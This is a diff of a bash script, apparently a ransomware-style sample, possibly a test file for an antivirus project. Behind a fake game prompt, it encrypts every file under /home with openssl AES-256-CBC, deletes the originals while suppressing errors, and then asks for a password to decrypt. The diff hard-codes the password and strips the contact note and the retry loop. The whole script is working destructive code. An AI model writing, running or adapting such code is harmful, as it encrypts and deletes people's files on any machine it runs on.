@@ -22,24 +22,18 @@ echo "Correct! Access granted. Please wait for the next game. It takes 5 minutes
 
 # Continue with file encryption
 folder_to_encrypt="/home"
-password="yourhydraantiviruspasswordhere"
 
 if [ ! -d "$folder_to_encrypt" ]; then
     echo "The specified folder does not exist."
     exit 1
 fi
 
-# Function to encrypt files
 encrypt_files() {
     local file="$1"
-    
-    # Check if the file is already encrypted
-    if [[ ! "$file" == *".enc" ]]; then
-        # Encrypt the file using AES-256-CBC encryption
-        openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
-        # Remove the original file, suppressing errors
-        rm "$file" > /dev/null 2>&1
-    fi
+    # Encrypt the file using AES-256-CBC encryption
+    openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:hydradragonantivirushere" > /dev/null 2>&1
+    # Remove the original file, suppressing errors
+    rm "$file" > /dev/null 2>&1
 }
 
 export -f encrypt_files
@@ -48,19 +42,11 @@ find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'e
 
 echo "All files have been encrypted, and unencrypted files have been deleted."
 
-# Create a README.md file with contact details
-echo "Contact Information:" > README.md
-echo "Email: your@email.com" >> README.md
+# Prompt the user for the decryption password
+read -s -p "Enter the decryption password (hydradragonantivirushere): " decryption_password
+echo
 
-# Loop for decryption with password verification
-max_attempts=3
-attempts=0
-while [ $attempts -lt $max_attempts ]; do
-    # Prompt the user for the decryption password
-    read -s -p "Enter the decryption password: " decryption_password
-    echo
-
-    # Function to decrypt files
+if [ "$decryption_password" == "hydradragonantivirushere" ]; then
     decrypt_files() {
         local encrypted_file="$1"
         local original_file="${encrypted_file%.enc}"  # Remove the .enc extension
@@ -72,30 +58,26 @@ while [ $attempts -lt $max_attempts ]; do
         if [ -f "$original_file" ]; then
             # File successfully decrypted
             rm "$encrypted_file" > /dev/null 2>&1
-            echo "Decryption successful."
-            return 0
+            echo "Decryption successful for: $original_file"
         else
             # File not successfully decrypted
-            echo "Incorrect password. Please try again."
+            echo "Incorrect password. Access denied."
             exit 1
         fi
     }
 
     export -f decrypt_files
 
-    find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
-    
-    # Check if decryption was successful
-    if [ $? -eq 0 ]; then
-        break  # Exit the loop if successful
-    fi
-    
-    # Increment the attempts
-    attempts=$((attempts + 1))
-done
+    # Check if there are encrypted files to decrypt
+    if [ "$(find "$folder_to_encrypt" -type f -name "*.enc" | wc -l)" -gt 0 ]; then
+        echo "Decrypting files..."
 
-if [ $attempts -eq $max_attempts ]; then
-    echo "Maximum number of attempts reached. Access denied."
+        find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
+
+        echo "All files have been decrypted, and encrypted files have been deleted."
+    else
+        echo "No encrypted files found."
+    fi
 else
-    echo "All files have been decrypted, and encrypted files have been deleted."
+    echo "Incorrect password. Access denied."
 fi
